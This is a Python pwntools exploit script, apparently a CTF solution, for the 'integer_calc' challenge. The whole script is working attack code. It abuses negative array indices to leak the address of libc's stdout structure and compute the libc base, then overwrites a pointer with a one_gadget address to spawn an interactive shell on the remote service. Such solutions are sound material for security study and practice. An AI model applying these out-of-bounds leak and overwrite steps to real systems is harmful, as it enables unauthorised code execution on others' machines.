#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host arithmetic-calculator.chal.idek.team --port 1337 ./integer_calc
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./integer_calc_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'arithmetic-calculator.chal.idek.team'
port = int(args.PORT or 1337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

libc = exe.libc

io.sendlineafter("> ","2")
io.sendlineafter(": ","-4")
io.sendlineafter(": ","0")
io.recvuntil(": ")

data = int(io.recvline()[:-1])
libc.address = data - libc.sym['_IO_2_1_stdout_']
print hex(libc.address)
off = [0xe6e73,0xe6c81,0xe6c84]
one = libc.address+off[1]

io.sendlineafter("> ","0")
io.sendlineafter(": ","-7")
io.sendlineafter(": ",str(one))


io.interactive()
